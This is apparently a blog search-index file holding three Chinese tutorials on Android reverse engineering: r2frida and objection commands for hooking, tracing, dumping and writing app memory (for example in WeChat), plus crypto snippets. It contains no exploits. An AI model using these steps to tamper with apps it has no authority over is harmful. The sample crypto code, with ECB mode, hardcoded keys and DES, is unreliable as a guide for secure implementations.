<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>r2frida使用</title>
      <link href="/2021/02/19/r2frida%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/02/19/r2frida%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>radare2和frida的结合体，多用于native代码的hook和调试。参考：<a href="https://github.com/nowsecure/r2frida" target="_blank" rel="noopener">https://github.com/nowsecure/r2frida</a></p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><ol><li>先安装radare2, 参考<a href="https://github.com/radareorg/radare2" target="_blank" rel="noopener">https://github.com/radareorg/radare2</a></li><li>r2pm -ci r2frida</li></ol><h2 id="三、使用"><a href="#三、使用" class="headerlink" title="三、使用"></a>三、使用</h2><p>这里列举常用的命令，更详细操作参考r2wiki <a href="https://r2wiki.readthedocs.io/en/latest/radare-plugins/frida/" target="_blank" rel="noopener">https://r2wiki.readthedocs.io/en/latest/radare-plugins/frida/</a></p><h3 id="1-用r2frida开启调试"><a href="#1-用r2frida开启调试" class="headerlink" title="1. 用r2frida开启调试"></a>1. 用r2frida开启调试</h3><p>现在搜到的教程一般是较老的使用方式，运行r2 “frida://?”查看最新使用方法：</p><p>分为local、usb和remote三种：<br><img src="/images/pasted-265.png" alt="upload successful"></p><p>调试手机的APP，这里使用:</p><ul><li>spawn模式 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 frida://spawn/usb//com.tencent.mm</span><br></pre></td></tr></table></figure></li></ul><p>使用spawn模式，需要运行”\dc“实现进程resume(r2frida命令以 =! 或 \ 为前缀，后边加问号可以查看命令帮助，例如\?，=!?, dc表示continue断点或resume进程)<br><img src="/images/pasted-266.png" alt="upload successful"></p><ul><li>attach模式 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 frida://attach/usb//com.tencent.mm</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-内存搜索"><a href="#2-内存搜索" class="headerlink" title="2. 内存搜索"></a>2. 内存搜索</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\/ keyword (注意有空格)</span><br></pre></td></tr></table></figure><ul><li>例如在微信进程搜索”\/ fuck Xiao Mi“</li></ul><p><img src="/images/pasted-267.png" alt="upload successful"></p><ul><li>查看内存具体位置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x @ 地址  (x 是 px 命令的简写，这个命令作用是show hexdump)</span><br></pre></td></tr></table></figure></li></ul><p><img src="/images/pasted-268.png" alt="upload successful"></p><ul><li>格式化输出</li></ul><p><img src="/images/pasted-269.png" alt="upload successful"></p><h3 id="3-d"><a href="#3-d" class="headerlink" title="3. d"></a>3. d</h3><p>d应dynamic的意思，主要实现动态调试的功能,常见的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">d.                         Start the chrome tools debugger</span><br><span class="line">db (&lt;addr&gt;|&lt;sym&gt;)          List or place breakpoint</span><br><span class="line">db- (&lt;addr&gt;|&lt;sym&gt;)|*       Remove breakpoint(s)</span><br><span class="line">dc                         Continue breakpoints or resume a spawned process</span><br><span class="line">dd[j-][fd] ([newfd])       List, dup2 or close filedescriptors (ddj for JSON)</span><br><span class="line">di[0,1,-1] [addr]          Intercept and replace return value of address</span><br><span class="line">dk ([pid]) [sig]           Send specific signal to specific pid in the remote system</span><br><span class="line">dkr                        Print the crash report (if the app has crashed)</span><br><span class="line">dl libname                 Dlopen a library (Android see chcon)</span><br><span class="line">dl2 libname [main]         Inject library using Frida&apos;s &gt;= 8.2 new API</span><br><span class="line">dlf path                   Load a Framework Bundle (iOS) given its path</span><br><span class="line">dlf- path                  Unload a Framework Bundle (iOS) given its path</span><br><span class="line">dm[.|j|*]                  Show memory regions</span><br><span class="line">dma &lt;size&gt;                 Allocate &lt;size&gt; bytes on the heap, address is returned</span><br><span class="line">dma- (&lt;addr&gt;...)           Kill the allocations at &lt;addr&gt; (or all of them without param)</span><br><span class="line">dmad &lt;addr&gt; &lt;size&gt;         Allocate &lt;size&gt; bytes on the heap, copy contents from &lt;addr&gt;</span><br><span class="line">dmal                       List live heap allocations created with dma[s]</span><br><span class="line">dmas &lt;string&gt;              Allocate a string initiated with &lt;string&gt; on the heap</span><br><span class="line">dmh                        List all heap allocated chunks</span><br><span class="line">dmh*                       Export heap chunks and regions as r2 flags</span><br><span class="line">dmhj                       List all heap allocated chunks in JSON</span><br><span class="line">dmhm                       Show which maps are used to allocate heap chunks</span><br><span class="line">dmm                        List all named squashed maps</span><br><span class="line">dmp &lt;addr&gt; &lt;size&gt; &lt;perms&gt;  Change page at &lt;address&gt; with &lt;size&gt;, protection &lt;perms&gt; (rwx)</span><br><span class="line">dp                         Show current pid</span><br><span class="line">dpt                        Show threads</span><br><span class="line">dr                         Show thread registers (see dpt)</span><br><span class="line">dt (&lt;addr&gt;|&lt;sym&gt;) ..       Trace list of addresses or symbols</span><br><span class="line">dt- (&lt;addr&gt;|&lt;sym&gt;)         Clear trace</span><br><span class="line">dt-*                       Clear all tracing</span><br><span class="line">dt.                        Trace at current offset</span><br><span class="line">dtf &lt;addr&gt; [fmt]           Trace address with format (^ixzO) (see dtf?)</span><br><span class="line">dth (addr|sym)(x:0 y:1 ..) Define function header (z=str,i=int,v=hex barray,s=barray)</span><br><span class="line">dtl[-*] [msg]              debug trace log console, useful to .\T*</span><br><span class="line">dtr &lt;addr&gt; (&lt;regs&gt;...)     Trace register values</span><br><span class="line">dts[*j] seconds            Trace all threads for given seconds using the stalker</span><br><span class="line">dtsf[*j] [sym|addr]        Trace address or symbol using the stalker (Frida &gt;= 10.3.13)</span><br><span class="line">dxc [sym|addr] [args..]    Call the target symbol with given args</span><br></pre></td></tr></table></figure></p><ul><li>\db 地址或符号   打断点</li><li>\db-  地址或符号   取消断点</li><li>\dc  继续运行</li><li>\dm  列出内存maps</li><li>\dm~keyword   匹配关键字</li><li>\dma 10  分配特定大小的内存</li><li>\dmas xxxx  堆上分配字符串</li><li>\dp  显示进程号</li><li><p>\dpt  显示线程</p></li><li><p>\dt addr 跟踪某个地址调用</p></li><li>\dtr addr  跟踪地址调用，并输出寄存器信息</li><li><p>\dtf addr format  跟踪地址调用，并输出调用栈、字符、onEnter、onExit等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage: dtf [format] || dtf [addr] [fmt]</span><br><span class="line">         ^ = trace onEnter instead of onExit</span><br><span class="line">         + = show backtrace on trace</span><br><span class="line">         x = show hexadecimal argument</span><br><span class="line">         i = show decimal argument</span><br><span class="line">         z = show pointer to string</span><br><span class="line">         O = show pointer to ObjC object</span><br></pre></td></tr></table></figure></li><li><p>\dxc 调用指定函数,需要提供参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如</span><br><span class="line">\dxc write 1 &quot;hello\n&quot; 6  </span><br><span class="line">write参数列表(int fd, const void *buf, size_t count);</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-i"><a href="#4-i" class="headerlink" title="4. i"></a>4. i</h3><p>i应该是info的意思，主要是显示一些静态的分析结果<br><img src="/images/pasted-271.png" alt="upload successful"></p><ul><li>\i  dump基本信息</li><li>\il  列出所有的modules</li><li>\ilj  以json格式列出modules</li><li>\iE modulename  列出某个module的导出表</li><li>\ii modulename  列出某个module的导入表</li><li>\ic classname   列出某个累的所有函数 </li></ul><h3 id="5-w"><a href="#5-w" class="headerlink" title="5. w"></a>5. w</h3><p>w应该是write，写入操作</p><ul><li>w string @0xfffff   向指定地址写入字符串</li><li>wx  0xff  @0xe9322cca  写入二进制字节</li><li>w0 5 @0xe9322cca  写入5个字节0</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android常见加密算法实现</title>
      <link href="/2020/12/28/Android%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/"/>
      <url>/2020/12/28/Android%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>逆向的时候，经常会遇到各种加密算法，google查起来比较乱，这里整理下。</p><p>编码：base64、<br>哈希算法：md5、sha-1、sha-256<br>对称加密：AES、DES、3DES<br>非对称加密：RSA</p><h2 id="一、常见算法的Android实现"><a href="#一、常见算法的Android实现" class="headerlink" title="一、常见算法的Android实现"></a>一、常见算法的Android实现</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//编码</span><br><span class="line">byte[] data = text.getBytes(&quot;UTF-8&quot;);</span><br><span class="line">String base64 = Base64.encodeToString(data, Base64.DEFAULT);</span><br><span class="line"></span><br><span class="line">//解码</span><br><span class="line">String x = &quot;&quot;</span><br><span class="line">byte[] data = Base64.decode(x, Base64.DEFAULT);</span><br><span class="line">String text = new String(data, &quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure><h3 id="md5、sha-1、sha-256"><a href="#md5、sha-1、sha-256" class="headerlink" title="md5、sha-1、sha-256"></a>md5、sha-1、sha-256</h3><p>写法都一样，区别在于MessageDigest.getInstance(“MD5”)指明要使用的算法，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fun md5(str: String): String &#123;</span><br><span class="line">    val digest = MessageDigest.getInstance(&quot;MD5&quot;)</span><br><span class="line">    val result = digest.digest(str.toByteArray())</span><br><span class="line">    //没转16进制之前是16位</span><br><span class="line">    println(&quot;result$&#123;result.size&#125;&quot;)</span><br><span class="line">    //转成16进制后是32字节</span><br><span class="line">    return toHex(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun sha1(str:String): String &#123;</span><br><span class="line">    val digest = MessageDigest.getInstance(&quot;SHA-1&quot;)</span><br><span class="line">    val result = digest.digest(str.toByteArray())</span><br><span class="line">    return toHex(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun sha256(str:String): String &#123;</span><br><span class="line">    val digest = MessageDigest.getInstance(&quot;SHA-256&quot;)</span><br><span class="line">    val result = digest.digest(str.toByteArray())</span><br><span class="line">    return toHex(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>这里DES加解密的区别只有一点，<br>cipher.init(Cipher.DECRYPT_MODE, securekey, sr)，Cipher.DECRYPT_MODE为解密，Cipher.ENCRYPT_MODE为加密。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//DES加密</span><br><span class="line">//DES加密的key必须是8个字节</span><br><span class="line">String key=&quot;mykeysss&quot;; </span><br><span class="line">    // 生成一个可信任的随机数</span><br><span class="line">    SecureRandom sr = new SecureRandom();</span><br><span class="line"></span><br><span class="line">    // 从原始密钥数据创建DESKeySpec对象</span><br><span class="line">    DESKeySpec dks = new DESKeySpec(key.getBytes());</span><br><span class="line"></span><br><span class="line">    // 创建一个密钥工厂，然后用它把DESKeySpec转换成SecretKey对象</span><br><span class="line">    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;);</span><br><span class="line">    SecretKey securekey = keyFactory.generateSecret(dks);</span><br><span class="line"></span><br><span class="line">    // Cipher对象实际完成加密操作</span><br><span class="line">    Cipher cipher = Cipher.getInstance(&quot;DES&quot;); //默认为DES/ECB/PKCS5Padding</span><br><span class="line"></span><br><span class="line">    // 用密钥初始化Cipher对象</span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, securekey, sr);</span><br><span class="line"></span><br><span class="line">    return cipher.doFinal(data);</span><br><span class="line"></span><br><span class="line">//DES解密</span><br><span class="line">//DES解密的key必须是8个字节</span><br><span class="line">String key=&quot;mykeysss&quot;;</span><br><span class="line">    // 生成一个可信任的随机数源</span><br><span class="line">    SecureRandom sr = new SecureRandom();</span><br><span class="line"></span><br><span class="line">    // 从原始密钥数据创建DESKeySpec对象</span><br><span class="line">    DESKeySpec dks = new DESKeySpec(key.getBytes());</span><br><span class="line"></span><br><span class="line">    // 创建一个密钥工厂，然后用它把DESKeySpec转换成SecretKey对象</span><br><span class="line">    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;DES&quot;);</span><br><span class="line">    SecretKey securekey = keyFactory.generateSecret(dks);</span><br><span class="line"></span><br><span class="line">    // Cipher对象实际完成解密操作</span><br><span class="line">    Cipher cipher = Cipher.getInstance(&quot;DES&quot;); //默认为DES/ECB/PKCS5Padding</span><br><span class="line"></span><br><span class="line">    // 用密钥初始化Cipher对象</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, securekey, sr);</span><br><span class="line"></span><br><span class="line">    return cipher.doFinal(data);</span><br></pre></td></tr></table></figure></p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><p>AES加解密的区别也是只有一个地方，cipher.init(Cipher.DECRYPT_MODE, skeySpec)，Cipher.DECRYPT_MODE为解密，Cipher.ENCRYPT_MODE 加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//AES加密</span><br><span class="line">    String key = &quot;mysecret&quot;;</span><br><span class="line">    byte[] raw = key.getBytes(&quot;utf-8&quot;);</span><br><span class="line">    SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line"></span><br><span class="line">    //初始化cipher 算法/模式/补码方式</span><br><span class="line">    Cipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);</span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line"></span><br><span class="line">    //加密</span><br><span class="line">    byte[] bytesContent;</span><br><span class="line">    byte[] enc = cipher.doFinal(bytesContent);</span><br><span class="line">    return enc;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">//AES解密</span><br><span class="line">    //key相关</span><br><span class="line">    byte[] raw = key.getBytes(&quot;utf-8&quot;);</span><br><span class="line">    SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line"></span><br><span class="line">    //&quot;算法/模式/补码方式&quot; 初始化cipher</span><br><span class="line">    Cipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, skeySpec);</span><br><span class="line"></span><br><span class="line">    //执行解密</span><br><span class="line">    byte[] bytesContent;</span><br><span class="line">    byte[] dec = cipher.doFinal(bytesContent);</span><br><span class="line">    return dec;</span><br></pre></td></tr></table></figure></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//秘钥长度为1024 生成公钥和私钥</span><br><span class="line">KeyPairGenerator keyPairGenerator=KeyPairGenerator.getInstance(&quot;RSA&quot;);</span><br><span class="line">keyPairGenerator.initialize(1024);</span><br><span class="line">KeyPair keyPair= keyPairGenerator.generateKeyPair();</span><br><span class="line"></span><br><span class="line">//获取公钥 私钥</span><br><span class="line">PublicKey publicKey=keyPair.getPublic();</span><br><span class="line">PrivateKey privateKey=keyPair.getPrivate();</span><br><span class="line"></span><br><span class="line">//公钥加密 java默认&quot;RSA&quot;=&quot;RSA/ECB/PKCS1Padding&quot;</span><br><span class="line">Cipher cipher=Cipher.getInstance(&quot;RSA&quot;);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, publicKey);</span><br><span class="line">byte[] encBytes = cipher.doFinal(bytesData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//私钥解密 java默认&quot;RSA&quot;=&quot;RSA/ECB/PKCS1Padding&quot;</span><br><span class="line">Cipher cipher1=Cipher.getInstance(&quot;RSA&quot;);</span><br><span class="line">cipher1.init(Cipher.DECRYPT_MODE, privateKey);</span><br><span class="line">byte[] decBytes = cipher1.doFinal(encBytes);</span><br><span class="line">Log.d(&quot;xxx&quot;,new String(decBytes));</span><br></pre></td></tr></table></figure><h2 id="二、python实现"><a href="#二、python实现" class="headerlink" title="二、python实现"></a>二、python实现</h2><p>逆向时需要进行算法验证，比较讨厌java代码的写法，可以用python进行验证。</p><h3 id="python-base64"><a href="#python-base64" class="headerlink" title="python base64"></a>python base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s = &quot;mykey&quot;</span><br><span class="line"># 必须为byte类型</span><br><span class="line">encoder = base64.b64encode(s.encode(&quot;utf-8&quot;))</span><br><span class="line">print(encoder) # byte类型 b&apos;5oiR5piv5LiA5Liq5a2X56ym5Liy&apos;</span><br><span class="line">print(encoder.decode(&apos;utf-8&apos;)) # str类型 5oiR5piv5LiA5Liq5a2X56ym5Liy</span><br><span class="line"></span><br><span class="line"># 解码过程</span><br><span class="line">#参数为string类型</span><br><span class="line">s = &apos;5oiR5piv5LiA5Liq5a2X56ym5Liy&apos;</span><br><span class="line">decoder = base64.b64decode(s)</span><br><span class="line">print(decoder.decode(&apos;utf-8&apos;)) # str类型</span><br></pre></td></tr></table></figure><h3 id="python-DES"><a href="#python-DES" class="headerlink" title="python DES"></a>python DES</h3><p>需要保证ECB或CBC模式、padmode与java实现一致。例如java的Cipher.getInstance(“DES”)默认为DES/ECB/PKCS5Padding模式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pyDes import *</span><br><span class="line"></span><br><span class="line">def des_encrypt(s):</span><br><span class="line">    secret_key = &apos;QExW+yCC&apos;</span><br><span class="line">    iv = secret_key</span><br><span class="line">    k = des(secret_key, ECB, iv, pad=None, padmode=PAD_PKCS5)</span><br><span class="line">    en = k.encrypt(s, padmode=PAD_PKCS5)</span><br><span class="line">    return en</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def des_descrypt(s):</span><br><span class="line">    secret_key = &apos;QExW+yCC&apos;</span><br><span class="line">    iv = secret_key</span><br><span class="line">    k = des(secret_key, ECB, iv, pad=None, padmode=PAD_PKCS5)</span><br><span class="line">    de = k.decrypt(s, padmode=PAD_PKCS5)</span><br><span class="line">    return de</span><br></pre></td></tr></table></figure></p><h3 id="python-AES"><a href="#python-AES" class="headerlink" title="python AES"></a>python AES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#pip3 install pycryptodome</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">data = b&quot;aaaaaaa&quot;</span><br><span class="line">key = b&apos;Sixteen byte key&apos;</span><br><span class="line">cipher = AES.new(key, AES.MODE_EAX)</span><br><span class="line">nonce = cipher.nonce</span><br><span class="line">ciphertext, tag = cipher.encrypt_and_digest(data)</span><br><span class="line">print(ciphertext, tag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = b&apos;Sixteen byte key&apos;</span><br><span class="line">cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)</span><br><span class="line">plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">try:</span><br><span class="line">    cipher.verify(tag)</span><br><span class="line">    print(&quot;The message is authentic:&quot;, plaintext)</span><br><span class="line">except ValueError:</span><br><span class="line">    print(&quot;Key incorrect or message corrupted&quot;)</span><br></pre></td></tr></table></figure><h3 id="python-RSA"><a href="#python-RSA" class="headerlink" title="python RSA"></a>python RSA</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from Crypto.PublicKey import RSA</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; key = RSA.generate(2048)</span><br><span class="line">&gt;&gt;&gt; f = open(&apos;mykey.pem&apos;,&apos;wb&apos;)</span><br><span class="line">&gt;&gt;&gt; f.write(key.export_key(&apos;PEM&apos;))</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; f = open(&apos;mykey.pem&apos;,&apos;r&apos;)</span><br><span class="line">&gt;&gt;&gt; key = RSA.import_key(f.read())</span><br></pre></td></tr></table></figure><h2 id="三、openssl命令"><a href="#三、openssl命令" class="headerlink" title="三、openssl命令"></a>三、openssl命令</h2><p>使用openssl命令似乎更方便</p><h3 id="base64-1"><a href="#base64-1" class="headerlink" title="base64"></a>base64</h3><p>编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo m4bln | openssl base64</span><br></pre></td></tr></table></figure></p><p>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo YWJjCg== | openssl base64 -d</span><br></pre></td></tr></table></figure></p><h3 id="md5-sha1-sha256"><a href="#md5-sha1-sha256" class="headerlink" title="md5/sha1/sha256"></a>md5/sha1/sha256</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo abc | openssl md5</span><br><span class="line">echo abc | openssl sha1</span><br><span class="line">echo abc | openssl sha256</span><br></pre></td></tr></table></figure><h3 id="des-aes-rsa"><a href="#des-aes-rsa" class="headerlink" title="des/aes/rsa"></a>des/aes/rsa</h3><p>待补充</p><p>参考资料：</p><ol><li>android官方文档-加密 <a href="https://developer.android.com/guide/topics/security/cryptography?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/guide/topics/security/cryptography?hl=zh-cn</a></li><li>frida hook AES DES RSA 自吐算法 <a href="https://zhuanlan.zhihu.com/p/320229007" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/320229007</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>objection操作</title>
      <link href="/2020/08/13/objection%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/13/objection%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>objection（<a href="https://github.com/sensepost/objection）集成了一些基于Frida的hook脚本，用一条命令即可实现内存搜索、类函数hook等操作，同时支持Android和iOS,在逆向APP时非常方便。" target="_blank" rel="noopener">https://github.com/sensepost/objection）集成了一些基于Frida的hook脚本，用一条命令即可实现内存搜索、类函数hook等操作，同时支持Android和iOS,在逆向APP时非常方便。</a></p><h3 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h3><ol><li>运行Frida server</li><li>启动objection （pip3 install objection –upgrade更新到最新版）<ul><li>正常启动：<br>objection -g com.xxx.xxx explore</li><li>指定ip和端口（与frida-server一致）<br>objection -N -h 192.168.1.221 -p 9999 -g com.xxx.xxx explore</li></ul></li></ol><h3 id="objection操作"><a href="#objection操作" class="headerlink" title="objection操作"></a>objection操作</h3><p>objection的操作和参数如下图，具体可以在 objection –help 中查看。<br><img src="/images/pasted-248.png" alt="upload successful"></p><p>按空格键会出现命令提示</p><ul><li>env  当前APP的环境变量</li></ul><p><img src="/images/pasted-254.png" alt="upload successful"></p><ul><li><p>file 文件相关<br>file download <remote path=""> [<local path="">]<br>file upload <local path=""> [<remote path="">]<br>file http start  当前目录下启动一个http server<br><img src="/images/pasted-255.png" alt="upload successful"></remote></local></local></remote></p></li><li><p>import 1.js   导入外部js脚本</p></li></ul><p><img src="/images/pasted-256.png" alt="upload successful"></p><ul><li>plugin load 加载外部脚本</li><li>reconnect 重连frida server</li><li>grep<br>object的命令执行结果是无法grep的，可以使用objection run xxx | grep yyy的方式,例如objection -g com.tencent.mm run memory list modules|grep xxx</li></ul><h4 id="memory操作"><a href="#memory操作" class="headerlink" title="memory操作"></a>memory操作</h4><ul><li>memory list modules  列出加载的module</li></ul><p><img src="/images/pasted-249.png" alt="upload successful"></p><ul><li>memory list exports libssl.so 查看指定module的导出函数<br>memory list exports libssl.so –json /tmp/export.json 将结果保存到文件</li></ul><p><img src="/images/pasted-250.png" alt="upload successful"></p><ul><li>memory dump all /tmp/dump  dump所有内存</li></ul><p><img src="/images/pasted-251.png" alt="upload successful"></p><ul><li>memory dump from_base <base_address> <size_to_dump> <local_destination> 指定地址和大小dump内存</local_destination></size_to_dump></base_address></li></ul><p><img src="/images/pasted-252.png" alt="upload successful"></p><ul><li>memory search “frida” –string 内存中搜索(–offsets-only 搜索结果只显示offerset)<br>memory search “66 72 69 64 61” 按字节搜索<br>memory search “66 72 ?? ?? 